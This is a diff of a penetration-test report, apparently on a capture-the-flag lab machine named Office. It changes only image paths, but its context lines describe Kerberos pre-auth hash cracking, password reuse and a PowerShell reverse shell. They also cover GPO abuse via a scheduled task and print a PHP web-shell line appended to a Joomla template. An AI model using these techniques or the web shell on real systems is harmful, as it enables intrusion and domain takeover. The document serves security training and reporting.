@@ -123,7 +123,7 @@ Included below is the exact reproduction steps taken, showing every part of the 
 The tester began with a port scan using the nmap tool to enumerate running services on the host. 
 
 This resulted in the discovery of a joomla blog on HTTP(TCP/80):
-![Initial Joomla Enum](/assets/images/office/jooma-enum.png)
+![Initial Joomla Enum](assets/images/office/jooma-enum.png)
 
 
 The tester fingerprinted the Joomla version by looking at the publicly accessible `joomla.xml` file on the `/administrator/manifests/files/joomla.xml` endpoint. 
@@ -283,17 +283,17 @@ drw-rw-rw-          0  Wed Feb 14 03:18:31 2024 ..
 
 
 The tester downloaded the packet capture file and analyzed it with Wireshark, a packet analysis tool.
-![Wireshark Protocol Hierarchy Statistics](/assets/images/office/Wireshark-stats.png)
+![Wireshark Protocol Hierarchy Statistics](assets/images/office/Wireshark-stats.png)
 FIGURE: Wireshark Protocol Hierarchy Statistics
 
 
 The tester discovered another user, `tstark`, in the packets containing Kerberos authentication.
-![Wireshark Kerberos Pre-auth packet](/assets/images/office/wireshark-kerb-preauth.png)
+![Wireshark Kerberos Pre-auth packet](assets/images/office/wireshark-kerb-preauth.png)
 
 
 The tester did some research and found a [article](https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/) detailing how these pre-auth kerberos packets can be abused to guess(or 'crack') the associated users password offline.
 
-![Wireshark Kerberos Pre-auth cipher](/assets/images/office/kerb-preauth-cipher.png)
+![Wireshark Kerberos Pre-auth cipher](assets/images/office/kerb-preauth-cipher.png)
 The cipher value was grabbed and re-arranged into a format accepted by the hashcat password cracking tool. 
 ```
 $krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxf5fc
@@ -343,13 +343,13 @@ The tester recalled the previous Joomla enumeration, which had listed `Tony Star
 ```
 
 The tester leveraged this knowledge and discovered password-reuse on the `tstark` account between the Active Directory Environment and the Joomla service.
-![Joomla Administration Portal](/assets/images/office/joomla-admin-panel.png)
+![Joomla Administration Portal](assets/images/office/joomla-admin-panel.png)
 
 With administrator access to the Joomla service, the tester navigated to System->Site Templates and customized the `offline.php` cassiopeia theme file to append a PHP web-shell
 `system($_GET['cmd_rand_b67e1aac-cf7c-4feb-a46f-03f5da39e725']);`
 
 NOTE: A random UUID was generated for the PHP web-shell URL parameter to avoid potential drive-by attacks or further compromise by attackers fuzzing parameters on the Joomla service pages during the assessment timeline. 
-![Joomla Theme Template Editor](/assets/images/office/joomla-theme-editor.png)
+![Joomla Theme Template Editor](assets/images/office/joomla-theme-editor.png)
 
 
 The tester makes a GET request to the modified offline.php endpoint, this resulted in remote code execution on the host
@@ -360,7 +360,7 @@ office\web_account
 
 
 The tester then used the [revshells](https://www.revshells.com/) web service to create a base64 encoded PowerShell reverse-shell payload. 
-![revshells Web Tool](/assets/images/office/revshells-webtool.png)
+![revshells Web Tool](assets/images/office/revshells-webtool.png)
 
 A nc(netcat) listener was started on the testers machine before the PowerShell reverse-shell payload was URL encoded and sent it to the webshell on the offline.php endpoint. 
 ```console?prompt=$
@@ -522,10 +522,10 @@ RDP         240.0.0.1       3389   DC               [+] office.htb\tstark:<REDAC
 ```
 
 The tester then navigated to the HTTP service running on port 8083 via a web-browser, this revealed a new web application for "Holography Industries"
-![New Site Enumeration](/assets/images/office/holo-web-enum.png)
+![New Site Enumeration](assets/images/office/holo-web-enum.png)
 
 After manual site enumeration, the /resume.php endpoint was discovered with a form to submit a job application. This form included a upload whitelist that only allows Doc, Docx, Docm, and odt file formats.
-![Job Application Submission](/assets/images/office/jobapp-submission.png)
+![Job Application Submission](assets/images/office/jobapp-submission.png)
 
 The tester uploaded a `.odt` open office file and searched for the file on the system through the PowerShell reverse-shell to discover the upload location.
 ```console?prompt=>
@@ -695,7 +695,7 @@ View the full module info with the info, or info -d command.
 
 
 The file is uploaded through the job application form.
-![Job Application Upload](/assets/images/office/application-upload.png)
+![Job Application Upload](assets/images/office/application-upload.png)
 
 metasploits msfconsole then caught the session
 ```
@@ -948,18 +948,18 @@ The tester then loads the collection data into the BloodHound GUI tool and marke
 
 
 The tester discovers that the `HHogan` user is a member of both the `REMOTE MANAGEMENT USERS` and `GPO MANAGERS` allows the user to access computers within the domain via WinRM while `GPO MANAGERS` allows writing to the `DEFAULT DOMAIN POLICY`. 
-![Bloodhound Route to Target](/assets/images/office/bhound-hhogan-to-target.png)
+![Bloodhound Route to Target](assets/images/office/bhound-hhogan-to-target.png)
 
 
 
 Next, the tester used bloodhound to plot out a path from the compromised users to the Domain Controller, `DC.OFFICE.HTB`
-![Bloodhound Route to Target](/assets/images/office/bhound-hhogan-to-target2.png)
+![Bloodhound Route to Target](assets/images/office/bhound-hhogan-to-target2.png)
 
 
 Due to HHogan being a member of `GPO MANAGERS`, the user has `GenericWrite` privileges over the `Default Domain Controllers Policy` allowing for a new policy to be pushed to the GPO. This was leveraged by the tester to push a policy that triggers an immediate scheduled task. 
 
 First the tester found the GPO file path via the BloodHound-GUI tool.
-![Bloodhound GPO Path](/assets/images/office/bhound-gpo-path.png)
+![Bloodhound GPO Path](assets/images/office/bhound-gpo-path.png)
 
 The tester then used `smbclient.py`, a tool from the impacket suite to establish a SMB session with the `SYSVOL` share on the `DC` host before navigating to the GPO and creating `Preferences\ScheduledTasks\ScheduledTasks.xml` under the `MACHINE` directory.
 ```console?prompt=$,#
@@ -1341,18 +1341,18 @@ The tester then loads the collection data into the BloodHound GUI tool and marke
 
 
 The tester discovers that the `HHogan` user is a member of both the `REMOTE MANAGEMENT USERS` and `GPO MANAGERS`. `REMOTE MANAGEMENT USERS` allows the user to access computers within the domain via WinRM while `GPO MANAGERS` allows writing to the `DEFAULT DOMAIN POLICY`. 
-![Bloodhound Route to Target](/assets/images/office/bhound-hhogan-to-target.png)
+![Bloodhound Route to Target](assets/images/office/bhound-hhogan-to-target.png)
 
 
 
 Next, the tester used bloodhound to plot out a path from the compromised users to the Domain Controller, `DC.OFFICE.HTB`
-![Bloodhound Route to Target](/assets/images/office/bhound-hhogan-to-target2.png)
+![Bloodhound Route to Target](assets/images/office/bhound-hhogan-to-target2.png)
 
 
 Due to HHogan being a member of `GPO MANAGERS`, the user has `GenericWrite` privileges over the `Default Domain Controllers Policy` allowing for a new policy to be pushed to the GPO. This was leveraged by the tester to push a policy that triggers an immediate scheduled task. 
 
 First the tester found the GPO file path via the BloodHound-GUI tool.
-![Bloodhound GPO Path](/assets/images/office/bhound-gpo-path.png)
+![Bloodhound GPO Path](assets/images/office/bhound-gpo-path.png)
 
 The tester then used `smbclient.py`, a tool from the impacket suite to establish a SMB session with the `SYSVOL` share on the `DC` host before navigating to the GPO and creating `Preferences\ScheduledTasks\ScheduledTasks.xml` under the `MACHINE` directory.
 ```console?prompt=$,#
@@ -1557,7 +1557,7 @@ The `dwolfe` Active Directory domain user was found to be using the same credent
 Finding Evidence:
 
 From the previously discovered sensitive packet capture in the  `SOC Analysis` SMB share, the tester was able to extract Kerberos Pre-Auth information, of which contained a crackable cipher.
-![Wireshark Kerberos Pre-auth cipher](/assets/images/office/kerb-preauth-cipher.png)
+![Wireshark Kerberos Pre-auth cipher](assets/images/office/kerb-preauth-cipher.png)
 The cipher value was grabbed and re-arranged into a format accepted by the hashcat password cracking tool. 
 ```
 $krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxf5fc
@@ -1631,16 +1631,16 @@ drw-rw-rw-          0  Wed Feb 14 03:18:31 2024 ..
 
 
 The tester downloaded the packet capture file and analyzed it with Wireshark, a packet analysis tool.
-![Wireshark Protocol Hierarchy Statistics](/assets/images/office/Wireshark-stats.png)
+![Wireshark Protocol Hierarchy Statistics](assets/images/office/Wireshark-stats.png)
 FIGURE: Wireshark Protocol Hierarchy Statistics
 
 
 The tester discovered another user, `tstark`, in the packets containing Kerberos authentication.
-![Wireshark Kerberos Pre-auth packet](/assets/images/office/wireshark-kerb-preauth.png)
+![Wireshark Kerberos Pre-auth packet](assets/images/office/wireshark-kerb-preauth.png)
 
 
 Cipher discovered within the Kerberos pre-authentication packet:
-![Wireshark Kerberos Pre-auth cipher](/assets/images/office/kerb-preauth-cipher.png)
+![Wireshark Kerberos Pre-auth cipher](assets/images/office/kerb-preauth-cipher.png)
 
 
 
@@ -1755,13 +1755,13 @@ The tester recalled the previous Joomla enumeration, which had listed `Tony Star
 ```
 
 The tester leveraged this knowledge and discovered password-reuse on the `tstark` account between the Active Directory Environment and the Joomla service.
-![Joomla Administration Portal](/assets/images/office/joomla-admin-panel.png)
+![Joomla Administration Portal](assets/images/office/joomla-admin-panel.png)
 
 With administrator access to the Joomla service, the tester navigated to System->Site Templates and customized the `FILE.PHP` theme file to append a PHP web-shell
 `system($_GET['cmd_rand_b67e1aac-cf7c-4feb-a46f-03f5da39e725']);`
 
 NOTE: A random UUID was generated for the PHP web-shell URL parameter to avoid potential drive-by attacks or further compromise by attackers fuzzing parameters on the Joomla service pages during the assessment timeline. 
-![Joomla Theme Template Editor](/assets/images/office/joomla-theme-editor.png)
+![Joomla Theme Template Editor](assets/images/office/joomla-theme-editor.png)
 
 
 The tester makes a GET request to the modified offline.php endpoint, this resulted in remote code execution on the `DC` host as the `office\web_account` user.
